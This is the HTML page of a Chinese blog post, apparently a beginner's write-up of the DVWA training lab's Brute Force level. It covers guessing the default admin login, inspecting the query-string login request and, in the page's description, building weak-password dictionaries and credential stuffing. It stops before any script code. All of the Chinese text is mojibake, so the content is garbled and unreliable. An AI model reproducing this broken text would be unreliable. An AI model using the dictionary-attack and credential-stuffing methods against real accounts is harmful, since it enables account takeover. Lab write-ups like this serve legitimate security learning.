<!doctype html><html lang=zh-cn dir=ltr>
<head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="å‰è¨€ èŒæ–°è¯•ç©DVWAï¼ŒBrute Force å’Œ Command Injection ä¸¤é“å…¥é—¨é¢˜ã€‚
Brute Force ä¿¡æ¯æ”¶é›† è¡¨å•å¾ˆç®€å•ï¼Œå°è¯•éšä¾¿ç»™ä¸ªç”¨æˆ·åå¯†ç ä¼šæŠ¥é”™ã€‚
å‡ºäºåŸºæœ¬çš„å¥½å¥‡å’Œè”æƒ³ï¼ˆä¸è¦è”æƒ³ï¼‰è¯•äº†ä¸‹adminå’Œpasswordï¼ˆå°±æ˜¯DVWAé»˜è®¤çš„ç™»é™†å¯†ç ï¼‰ï¼Œå‘ç°è¿™å°±æ˜¯æ­£ç¡®å¯†ç äº†ã€‚
å¥½å§ï¼ŒçŒœå‡ºæ¥ä¹Ÿç®—ã€‚ä½†é¢˜ç›®æ˜¯ Brute Forceï¼Œæ‰€ä»¥æœ¬æ„åº”è¯¥æ˜¯æ•´ä¸€ä¸ªæš´åŠ›ç ´è§£çš„è„šæœ¬ä»€ä¹ˆçš„å§ï¼Œåƒæ˜¯å…¬ç½‘ä¸Šå¤©å¤©æ‰« 22 ç«¯å£å°è¯•å¼±å¯†ç çš„æœºå™¨äººä¸€æ ·ã€‚
å‡ºäºè¿™æ ·çš„æƒ³æ³•ï¼Œå†çœ‹ä¸‹è¡¨å•æ€ä¹ˆæäº¤çš„ï¼Œèƒ½ä¸èƒ½ç›´æ¥å†™ä¸ªè„šæœ¬å‘ HTTP è¯·æ±‚æå®šã€‚
å†çœ‹ä¸‹ç½‘ç»œè¯·æ±‚ã€‚
ç”¨æˆ·åå¯†ç ç›´æ¥æ”¾åœ¨ QueryString é‡Œï¼Œçœ‹èµ·æ¥ä¹Ÿæ²¡ä»€ä¹ˆä¿æŠ¤ï¼Œæ—¢ç„¶è¿™æ ·è‡ªå·±æ„é€ è¯·æ±‚å°±å¾ˆè½»æ¾æ„‰å¿«äº†ã€‚
å‡†å¤‡ æš´åŠ›ç ´è§£ä¹Ÿæœ‰æš´åŠ›ç ´è§£çš„æŠ€å·§ã€‚
å¯æ¥å—çš„è¾“å…¥é•¿åº¦åœ¨æœ‰é™åŒºé—´çš„æƒ…å†µä¸‹ï¼Œç›´æ¥éå†æ‰€æœ‰å­—æ¯æ•°å­—ç‰¹æ®Šå­—ç¬¦ç»„åˆæ˜¯å¾ˆéš¾é¡¶çš„ï¼Œæ¯å¤šä¸€ä½å¯èƒ½çš„å¯†ç æ•°é‡éƒ½æ˜¯æŒ‡æ•°ä¸Šå‡ã€‚æ¯”å¦‚æœ€çŸ­ 6 ä½å¯†ç ï¼Œæ¥å— ASCII 127 ä¸ªå­—ç¬¦ï¼Œå°±æœ‰ 127^6 ç§å¯èƒ½çš„å¯†ç ï¼Œæœ€é•¿ 16 ä½å¯†ç å°±æ˜¯ 127^16ï¼Œæ¯æ¬¡å°è¯•èŠ±è´¹ 1ms çš„è¯ï¼Œæ‰€éœ€æ—¶é—´å¯ä»¥è¾¾åˆ° 1.44E+38 å¹´è¿™ä¹ˆä¹…ã€‚
ä½†äººä¸å¯èƒ½çœŸçš„éšæœºä»asciiç è¡¨é‡ŒéšæœºæŠ½å–å­—ç¬¦å½“å¯†ç ï¼Œæ‰€ä»¥æš´åŠ›ç ´è§£å…¶å®åªéœ€è¦å°è¯•æ¯”è¾ƒå¸¸è§çš„å¯†ç å°±è¡Œï¼ˆæ¯”å¦‚ç”Ÿæ—¥ã€åå­—ã€å•è¯ã€æœ‰è§„å¾‹çš„æ•°å­—ä»¥åŠè¿™äº›å…ƒç´ çš„ç»„åˆï¼‰ï¼Œè¿˜å¯ä»¥é€‰æ‹©ä»å…¶ä»–å·²æ³„éœ²çš„ç½‘ç«™é‡Œä¿å­˜çš„ç”¨æˆ·åå¯†ç æ¥â€œæ’åº“â€ç¢°è¿æ°”ã€‚
è¿™ç§â€œå¼±å¯†ç â€æ„æˆçš„è¡¨åœ¨ç½‘ä¸Šè¿˜æ˜¯æ¯”è¾ƒå®¹æ˜“æ‰¾åˆ°çš„ã€‚å®åœ¨ä¸è¡Œå¯ä»¥è‡ªå·±ç°ç¼–ä¸€ä¸ªï¼Œæ¯”å¦‚ç›´æ¥è‹±è¯­è¯å…¸ã€æ—¥æœŸã€å¸¸è§å§“åå‡‘ä¸€å‡‘ï¼Œå†æ‰¾ä¸ª 20xx å¹´ top N å¼±å¯†ç åˆèµ·æ¥å°±æ˜¯ä¸ªå¯ä»¥ä¸€æˆ˜çš„å¼±å¯†ç å­—å…¸äº†ã€‚ä¸è¿‡æœ€å¥½è¿˜æ˜¯æ‰¾ä¸ªé«˜è´¨é‡çš„å­—å…¸ï¼Œå¥½çš„å­—å…¸æ’åºèƒ½è®©æš´åŠ›ç ´å¯†ç æ›´å¿«ï¼ˆå°±æ˜¯ä»ç»Ÿè®¡ï¼ˆï¼Ÿï¼‰ä¸Šæ¥è¯´è¶Šé å‰çš„å¯†ç è¶Šå¸¸ç”¨ï¼Œè¶Šå¯èƒ½æ˜¯æ­£ç¡®çš„å¯†ç ï¼‰ã€‚
æŒ‘å¥½å­—å…¸ä¹‹åï¼Œå‰©ä¸‹å°±æ˜¯ç›´æ¥æŠŠè¿™ä¸ªå­—å…¸ä»å¤´åˆ°å°¾è¯•ä¸€éäº†ã€‚è¿™é‡Œæˆ‘éšä¾¿æ‰¾äº†ä¸ªWeak-passwordï¼ˆé‡Œé¢å¤§éƒ¨åˆ†å†…å®¹ä¸å…³å¿ƒä¹Ÿç”¨ä¸åˆ°ï¼‰ç›´æ¥ä¸‹è½½ zipã€‚
åˆ›å»ºä¸ª dvwa-writeup ä»“åº“ç”¨æ¥å­˜ dvwa é¢˜è§£è„šæœ¬ï¼ŒæŠŠ zip è§£å‹è¿›å»ã€‚
å°±æ˜¯è¿™æ ·ã€‚
ç¼–å†™è„šæœ¬ å‡ºäºä¸ªäººåå¥½ï¼Œä½¿ç”¨ python ç¼–å†™è„šæœ¬ã€‚
#!/usr/bin/env python3 # # WriteUp: brute force [Security Level: Low] # Author: weak_ptr # # NOTE: require python version &amp;gt;= 3."><title>DVWAä¸Šæ‰‹è®°å½•-ç®€å•å°è¯•</title>
<link rel=canonical href=https://nnnewb.github.io/blog/p/get-start-dvwa-02/>
<link rel=stylesheet href=/blog/scss/style.min.b80bf249ce4a22cf55e8d7340a0b37a2f2c10f54f3a9a49cb94b694a2eb0bbea.css><meta property="og:title" content="DVWAä¸Šæ‰‹è®°å½•-ç®€å•å°è¯•">
<meta property="og:description" content="å‰è¨€ èŒæ–°è¯•ç©DVWAï¼ŒBrute Force å’Œ Command Injection ä¸¤é“å…¥é—¨é¢˜ã€‚
Brute Force ä¿¡æ¯æ”¶é›† è¡¨å•å¾ˆç®€å•ï¼Œå°è¯•éšä¾¿ç»™ä¸ªç”¨æˆ·åå¯†ç ä¼šæŠ¥é”™ã€‚
å‡ºäºåŸºæœ¬çš„å¥½å¥‡å’Œè”æƒ³ï¼ˆä¸è¦è”æƒ³ï¼‰è¯•äº†ä¸‹adminå’Œpasswordï¼ˆå°±æ˜¯DVWAé»˜è®¤çš„ç™»é™†å¯†ç ï¼‰ï¼Œå‘ç°è¿™å°±æ˜¯æ­£ç¡®å¯†ç äº†ã€‚
å¥½å§ï¼ŒçŒœå‡ºæ¥ä¹Ÿç®—ã€‚ä½†é¢˜ç›®æ˜¯ Brute Forceï¼Œæ‰€ä»¥æœ¬æ„åº”è¯¥æ˜¯æ•´ä¸€ä¸ªæš´åŠ›ç ´è§£çš„è„šæœ¬ä»€ä¹ˆçš„å§ï¼Œåƒæ˜¯å…¬ç½‘ä¸Šå¤©å¤©æ‰« 22 ç«¯å£å°è¯•å¼±å¯†ç çš„æœºå™¨äººä¸€æ ·ã€‚
å‡ºäºè¿™æ ·çš„æƒ³æ³•ï¼Œå†çœ‹ä¸‹è¡¨å•æ€ä¹ˆæäº¤çš„ï¼Œèƒ½ä¸èƒ½ç›´æ¥å†™ä¸ªè„šæœ¬å‘ HTTP è¯·æ±‚æå®šã€‚
å†çœ‹ä¸‹ç½‘ç»œè¯·æ±‚ã€‚
ç”¨æˆ·åå¯†ç ç›´æ¥æ”¾åœ¨ QueryString é‡Œï¼Œçœ‹èµ·æ¥ä¹Ÿæ²¡ä»€ä¹ˆä¿æŠ¤ï¼Œæ—¢ç„¶è¿™æ ·è‡ªå·±æ„é€ è¯·æ±‚å°±å¾ˆè½»æ¾æ„‰å¿«äº†ã€‚
å‡†å¤‡ æš´åŠ›ç ´è§£ä¹Ÿæœ‰æš´åŠ›ç ´è§£çš„æŠ€å·§ã€‚
å¯æ¥å—çš„è¾“å…¥é•¿åº¦åœ¨æœ‰é™åŒºé—´çš„æƒ…å†µä¸‹ï¼Œç›´æ¥éå†æ‰€æœ‰å­—æ¯æ•°å­—ç‰¹æ®Šå­—ç¬¦ç»„åˆæ˜¯å¾ˆéš¾é¡¶çš„ï¼Œæ¯å¤šä¸€ä½å¯èƒ½çš„å¯†ç æ•°é‡éƒ½æ˜¯æŒ‡æ•°ä¸Šå‡ã€‚æ¯”å¦‚æœ€çŸ­ 6 ä½å¯†ç ï¼Œæ¥å— ASCII 127 ä¸ªå­—ç¬¦ï¼Œå°±æœ‰ 127^6 ç§å¯èƒ½çš„å¯†ç ï¼Œæœ€é•¿ 16 ä½å¯†ç å°±æ˜¯ 127^16ï¼Œæ¯æ¬¡å°è¯•èŠ±è´¹ 1ms çš„è¯ï¼Œæ‰€éœ€æ—¶é—´å¯ä»¥è¾¾åˆ° 1.44E+38 å¹´è¿™ä¹ˆä¹…ã€‚
ä½†äººä¸å¯èƒ½çœŸçš„éšæœºä»asciiç è¡¨é‡ŒéšæœºæŠ½å–å­—ç¬¦å½“å¯†ç ï¼Œæ‰€ä»¥æš´åŠ›ç ´è§£å…¶å®åªéœ€è¦å°è¯•æ¯”è¾ƒå¸¸è§çš„å¯†ç å°±è¡Œï¼ˆæ¯”å¦‚ç”Ÿæ—¥ã€åå­—ã€å•è¯ã€æœ‰è§„å¾‹çš„æ•°å­—ä»¥åŠè¿™äº›å…ƒç´ çš„ç»„åˆï¼‰ï¼Œè¿˜å¯ä»¥é€‰æ‹©ä»å…¶ä»–å·²æ³„éœ²çš„ç½‘ç«™é‡Œä¿å­˜çš„ç”¨æˆ·åå¯†ç æ¥â€œæ’åº“â€ç¢°è¿æ°”ã€‚
è¿™ç§â€œå¼±å¯†ç â€æ„æˆçš„è¡¨åœ¨ç½‘ä¸Šè¿˜æ˜¯æ¯”è¾ƒå®¹æ˜“æ‰¾åˆ°çš„ã€‚å®åœ¨ä¸è¡Œå¯ä»¥è‡ªå·±ç°ç¼–ä¸€ä¸ªï¼Œæ¯”å¦‚ç›´æ¥è‹±è¯­è¯å…¸ã€æ—¥æœŸã€å¸¸è§å§“åå‡‘ä¸€å‡‘ï¼Œå†æ‰¾ä¸ª 20xx å¹´ top N å¼±å¯†ç åˆèµ·æ¥å°±æ˜¯ä¸ªå¯ä»¥ä¸€æˆ˜çš„å¼±å¯†ç å­—å…¸äº†ã€‚ä¸è¿‡æœ€å¥½è¿˜æ˜¯æ‰¾ä¸ªé«˜è´¨é‡çš„å­—å…¸ï¼Œå¥½çš„å­—å…¸æ’åºèƒ½è®©æš´åŠ›ç ´å¯†ç æ›´å¿«ï¼ˆå°±æ˜¯ä»ç»Ÿè®¡ï¼ˆï¼Ÿï¼‰ä¸Šæ¥è¯´è¶Šé å‰çš„å¯†ç è¶Šå¸¸ç”¨ï¼Œè¶Šå¯èƒ½æ˜¯æ­£ç¡®çš„å¯†ç ï¼‰ã€‚
æŒ‘å¥½å­—å…¸ä¹‹åï¼Œå‰©ä¸‹å°±æ˜¯ç›´æ¥æŠŠè¿™ä¸ªå­—å…¸ä»å¤´åˆ°å°¾è¯•ä¸€éäº†ã€‚è¿™é‡Œæˆ‘éšä¾¿æ‰¾äº†ä¸ªWeak-passwordï¼ˆé‡Œé¢å¤§éƒ¨åˆ†å†…å®¹ä¸å…³å¿ƒä¹Ÿç”¨ä¸åˆ°ï¼‰ç›´æ¥ä¸‹è½½ zipã€‚
åˆ›å»ºä¸ª dvwa-writeup ä»“åº“ç”¨æ¥å­˜ dvwa é¢˜è§£è„šæœ¬ï¼ŒæŠŠ zip è§£å‹è¿›å»ã€‚
å°±æ˜¯è¿™æ ·ã€‚
ç¼–å†™è„šæœ¬ å‡ºäºä¸ªäººåå¥½ï¼Œä½¿ç”¨ python ç¼–å†™è„šæœ¬ã€‚
#!/usr/bin/env python3 # # WriteUp: brute force [Security Level: Low] # Author: weak_ptr # # NOTE: require python version &amp;gt;= 3.">
<meta property="og:url" content="https://nnnewb.github.io/blog/p/get-start-dvwa-02/">
<meta property="og:site_name" content="weakptr's ç¬”è®°">
<meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="security"><meta property="article:tag" content="DVWA"><meta property="article:published_time" content="2022-04-24T15:05:00+08:00"><meta property="article:modified_time" content="2022-04-24T15:05:00+08:00">
<meta name=twitter:title content="DVWAä¸Šæ‰‹è®°å½•-ç®€å•å°è¯•">
<meta name=twitter:description content="å‰è¨€ èŒæ–°è¯•ç©DVWAï¼ŒBrute Force å’Œ Command Injection ä¸¤é“å…¥é—¨é¢˜ã€‚
Brute Force ä¿¡æ¯æ”¶é›† è¡¨å•å¾ˆç®€å•ï¼Œå°è¯•éšä¾¿ç»™ä¸ªç”¨æˆ·åå¯†ç ä¼šæŠ¥é”™ã€‚
å‡ºäºåŸºæœ¬çš„å¥½å¥‡å’Œè”æƒ³ï¼ˆä¸è¦è”æƒ³ï¼‰è¯•äº†ä¸‹adminå’Œpasswordï¼ˆå°±æ˜¯DVWAé»˜è®¤çš„ç™»é™†å¯†ç ï¼‰ï¼Œå‘ç°è¿™å°±æ˜¯æ­£ç¡®å¯†ç äº†ã€‚
å¥½å§ï¼ŒçŒœå‡ºæ¥ä¹Ÿç®—ã€‚ä½†é¢˜ç›®æ˜¯ Brute Forceï¼Œæ‰€ä»¥æœ¬æ„åº”è¯¥æ˜¯æ•´ä¸€ä¸ªæš´åŠ›ç ´è§£çš„è„šæœ¬ä»€ä¹ˆçš„å§ï¼Œåƒæ˜¯å…¬ç½‘ä¸Šå¤©å¤©æ‰« 22 ç«¯å£å°è¯•å¼±å¯†ç çš„æœºå™¨äººä¸€æ ·ã€‚
å‡ºäºè¿™æ ·çš„æƒ³æ³•ï¼Œå†çœ‹ä¸‹è¡¨å•æ€ä¹ˆæäº¤çš„ï¼Œèƒ½ä¸èƒ½ç›´æ¥å†™ä¸ªè„šæœ¬å‘ HTTP è¯·æ±‚æå®šã€‚
å†çœ‹ä¸‹ç½‘ç»œè¯·æ±‚ã€‚
ç”¨æˆ·åå¯†ç ç›´æ¥æ”¾åœ¨ QueryString é‡Œï¼Œçœ‹èµ·æ¥ä¹Ÿæ²¡ä»€ä¹ˆä¿æŠ¤ï¼Œæ—¢ç„¶è¿™æ ·è‡ªå·±æ„é€ è¯·æ±‚å°±å¾ˆè½»æ¾æ„‰å¿«äº†ã€‚
å‡†å¤‡ æš´åŠ›ç ´è§£ä¹Ÿæœ‰æš´åŠ›ç ´è§£çš„æŠ€å·§ã€‚
å¯æ¥å—çš„è¾“å…¥é•¿åº¦åœ¨æœ‰é™åŒºé—´çš„æƒ…å†µä¸‹ï¼Œç›´æ¥éå†æ‰€æœ‰å­—æ¯æ•°å­—ç‰¹æ®Šå­—ç¬¦ç»„åˆæ˜¯å¾ˆéš¾é¡¶çš„ï¼Œæ¯å¤šä¸€ä½å¯èƒ½çš„å¯†ç æ•°é‡éƒ½æ˜¯æŒ‡æ•°ä¸Šå‡ã€‚æ¯”å¦‚æœ€çŸ­ 6 ä½å¯†ç ï¼Œæ¥å— ASCII 127 ä¸ªå­—ç¬¦ï¼Œå°±æœ‰ 127^6 ç§å¯èƒ½çš„å¯†ç ï¼Œæœ€é•¿ 16 ä½å¯†ç å°±æ˜¯ 127^16ï¼Œæ¯æ¬¡å°è¯•èŠ±è´¹ 1ms çš„è¯ï¼Œæ‰€éœ€æ—¶é—´å¯ä»¥è¾¾åˆ° 1.44E+38 å¹´è¿™ä¹ˆä¹…ã€‚
ä½†äººä¸å¯èƒ½çœŸçš„éšæœºä»asciiç è¡¨é‡ŒéšæœºæŠ½å–å­—ç¬¦å½“å¯†ç ï¼Œæ‰€ä»¥æš´åŠ›ç ´è§£å…¶å®åªéœ€è¦å°è¯•æ¯”è¾ƒå¸¸è§çš„å¯†ç å°±è¡Œï¼ˆæ¯”å¦‚ç”Ÿæ—¥ã€åå­—ã€å•è¯ã€æœ‰è§„å¾‹çš„æ•°å­—ä»¥åŠè¿™äº›å…ƒç´ çš„ç»„åˆï¼‰ï¼Œè¿˜å¯ä»¥é€‰æ‹©ä»å…¶ä»–å·²æ³„éœ²çš„ç½‘ç«™é‡Œä¿å­˜çš„ç”¨æˆ·åå¯†ç æ¥â€œæ’åº“â€ç¢°è¿æ°”ã€‚
è¿™ç§â€œå¼±å¯†ç â€æ„æˆçš„è¡¨åœ¨ç½‘ä¸Šè¿˜æ˜¯æ¯”è¾ƒå®¹æ˜“æ‰¾åˆ°çš„ã€‚å®åœ¨ä¸è¡Œå¯ä»¥è‡ªå·±ç°ç¼–ä¸€ä¸ªï¼Œæ¯”å¦‚ç›´æ¥è‹±è¯­è¯å…¸ã€æ—¥æœŸã€å¸¸è§å§“åå‡‘ä¸€å‡‘ï¼Œå†æ‰¾ä¸ª 20xx å¹´ top N å¼±å¯†ç åˆèµ·æ¥å°±æ˜¯ä¸ªå¯ä»¥ä¸€æˆ˜çš„å¼±å¯†ç å­—å…¸äº†ã€‚ä¸è¿‡æœ€å¥½è¿˜æ˜¯æ‰¾ä¸ªé«˜è´¨é‡çš„å­—å…¸ï¼Œå¥½çš„å­—å…¸æ’åºèƒ½è®©æš´åŠ›ç ´å¯†ç æ›´å¿«ï¼ˆå°±æ˜¯ä»ç»Ÿè®¡ï¼ˆï¼Ÿï¼‰ä¸Šæ¥è¯´è¶Šé å‰çš„å¯†ç è¶Šå¸¸ç”¨ï¼Œè¶Šå¯èƒ½æ˜¯æ­£ç¡®çš„å¯†ç ï¼‰ã€‚
æŒ‘å¥½å­—å…¸ä¹‹åï¼Œå‰©ä¸‹å°±æ˜¯ç›´æ¥æŠŠè¿™ä¸ªå­—å…¸ä»å¤´åˆ°å°¾è¯•ä¸€éäº†ã€‚è¿™é‡Œæˆ‘éšä¾¿æ‰¾äº†ä¸ªWeak-passwordï¼ˆé‡Œé¢å¤§éƒ¨åˆ†å†…å®¹ä¸å…³å¿ƒä¹Ÿç”¨ä¸åˆ°ï¼‰ç›´æ¥ä¸‹è½½ zipã€‚
åˆ›å»ºä¸ª dvwa-writeup ä»“åº“ç”¨æ¥å­˜ dvwa é¢˜è§£è„šæœ¬ï¼ŒæŠŠ zip è§£å‹è¿›å»ã€‚
å°±æ˜¯è¿™æ ·ã€‚
ç¼–å†™è„šæœ¬ å‡ºäºä¸ªäººåå¥½ï¼Œä½¿ç”¨ python ç¼–å†™è„šæœ¬ã€‚
#!/usr/bin/env python3 # # WriteUp: brute force [Security Level: Low] # Author: weak_ptr # # NOTE: require python version &amp;gt;= 3.">
</head>
<body class=article-page>
<script>(function(){const a='StackColorScheme';localStorage.getItem(a)||localStorage.setItem(a,"dark")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky">
<button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=åˆ‡æ¢èœå•>
<span class=hamburger-box>
<span class=hamburger-inner></span>
</span>
</button>
<header>
<figure class=site-avatar>
<a href=/blog>
<img src=/blog/img/avatar_hub37949326d1692892aa1e64434c0dda6_382115_300x0_resize_box_3.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
</a>
<span class=emoji>ğŸ‘</span>
</figure>
<div class=site-meta>
<h1 class=site-name><a href=/blog>weakptr's ç¬”è®°</a></h1>
<h2 class=site-description>å¼ƒèˆ¹ï¼</h2>
</div>
</header><ol class=menu id=main-menu>
<li>
<a href=/blog><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>é¦–é¡µ</span>
</a>
</li>
<li>
<a href=/blog/about><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>å…³äºæˆ‘</span>
</a>
</li>
<li>
<a href=/blog/archive><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>å½’æ¡£</span>
</a>
</li>
<li>
<a href=/blog/categories><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
<span>åˆ†ç±»</span>
</a>
</li>
<li>
<a href=/blog/link><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>å‹é“¾</span>
</a>
</li>
<div class=menu-bottom-section>
<li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>æš—è‰²æ¨¡å¼</span>
</li>
</div>
</ol>
</aside>
<main class="main full-width">
<article class=main-article>
<header class=article-header>
<div class=article-details>
<header class=article-category>
<a href=/blog/categories/security/>
security
</a>
</header>
<div class=article-title-wrapper>
<h2 class=article-title>
<a href=/blog/p/get-start-dvwa-02/>DVWAä¸Šæ‰‹è®°å½•-ç®€å•å°è¯•</a>
</h2>
</div>
<footer class=article-time>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>2022å¹´ 4æœˆ 24æ—¥</time>
</div>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>
é˜…è¯»æ—¶é•¿: 7 åˆ†é’Ÿ
</time>
</div>
</footer>
</div>
</header>
<section class=article-content>
<h2 id=å‰è¨€>å‰è¨€</h2>
<p>èŒæ–°è¯•ç©DVWAï¼ŒBrute Force å’Œ Command Injection ä¸¤é“å…¥é—¨é¢˜ã€‚</p>
<h2 id=brute-force>Brute Force</h2>
<h3 id=ä¿¡æ¯æ”¶é›†>ä¿¡æ¯æ”¶é›†</h3>
<p><img src=/blog/p/get-start-dvwa-02/image-20220421165951469.png width=678 height=310 srcset="/blog/p/get-start-dvwa-02/image-20220421165951469_hu968bfbff7b3908a335da7115c389096f_24097_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220421165951469_hu968bfbff7b3908a335da7115c389096f_24097_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220421165951469 class=gallery-image data-flex-grow=218 data-flex-basis=524px></p>
<p>è¡¨å•å¾ˆç®€å•ï¼Œå°è¯•éšä¾¿ç»™ä¸ªç”¨æˆ·åå¯†ç ä¼šæŠ¥é”™ã€‚</p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220421170044746.png width=293 height=208 srcset="/blog/p/get-start-dvwa-02/image-20220421170044746_hu922d70c9fe48b32784873287834092d4_5047_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220421170044746_hu922d70c9fe48b32784873287834092d4_5047_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220421170044746 class=gallery-image data-flex-grow=140 data-flex-basis=338px></p>
<p>å‡ºäºåŸºæœ¬çš„å¥½å¥‡å’Œè”æƒ³ï¼ˆä¸è¦è”æƒ³ï¼‰è¯•äº†ä¸‹<code>admin</code>å’Œ<code>password</code>ï¼ˆå°±æ˜¯DVWAé»˜è®¤çš„ç™»é™†å¯†ç ï¼‰ï¼Œå‘ç°è¿™å°±æ˜¯æ­£ç¡®å¯†ç äº†ã€‚</p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220421170146718.png width=349 height=273 srcset="/blog/p/get-start-dvwa-02/image-20220421170146718_hubdd8467726ec153ca4f4cd266c83a5da_24326_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220421170146718_hubdd8467726ec153ca4f4cd266c83a5da_24326_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220421170146718 class=gallery-image data-flex-grow=127 data-flex-basis=306px></p>
<p>å¥½å§ï¼ŒçŒœå‡ºæ¥ä¹Ÿç®—ã€‚ä½†é¢˜ç›®æ˜¯ Brute Forceï¼Œæ‰€ä»¥æœ¬æ„åº”è¯¥æ˜¯æ•´ä¸€ä¸ªæš´åŠ›ç ´è§£çš„è„šæœ¬ä»€ä¹ˆçš„å§ï¼Œåƒæ˜¯å…¬ç½‘ä¸Šå¤©å¤©æ‰« 22 ç«¯å£å°è¯•å¼±å¯†ç çš„æœºå™¨äººä¸€æ ·ã€‚</p>
<p>å‡ºäºè¿™æ ·çš„æƒ³æ³•ï¼Œå†çœ‹ä¸‹è¡¨å•æ€ä¹ˆæäº¤çš„ï¼Œèƒ½ä¸èƒ½ç›´æ¥å†™ä¸ªè„šæœ¬å‘ HTTP è¯·æ±‚æå®šã€‚</p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220421170531288.png width=431 height=198 srcset="/blog/p/get-start-dvwa-02/image-20220421170531288_hu7f69ddf94bb81e659ec24c8688d64b22_14037_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220421170531288_hu7f69ddf94bb81e659ec24c8688d64b22_14037_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220421170531288 class=gallery-image data-flex-grow=217 data-flex-basis=522px></p>
<p>å†çœ‹ä¸‹ç½‘ç»œè¯·æ±‚ã€‚</p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220421170720287.png width=1393 height=469 srcset="/blog/p/get-start-dvwa-02/image-20220421170720287_huc75cdf68db8e6c3f9a6464185546fd97_67655_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220421170720287_huc75cdf68db8e6c3f9a6464185546fd97_67655_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220421170720287 class=gallery-image data-flex-grow=297 data-flex-basis=712px></p>
<p>ç”¨æˆ·åå¯†ç ç›´æ¥æ”¾åœ¨ QueryString é‡Œï¼Œçœ‹èµ·æ¥ä¹Ÿæ²¡ä»€ä¹ˆä¿æŠ¤ï¼Œæ—¢ç„¶è¿™æ ·è‡ªå·±æ„é€ è¯·æ±‚å°±å¾ˆè½»æ¾æ„‰å¿«äº†ã€‚</p>
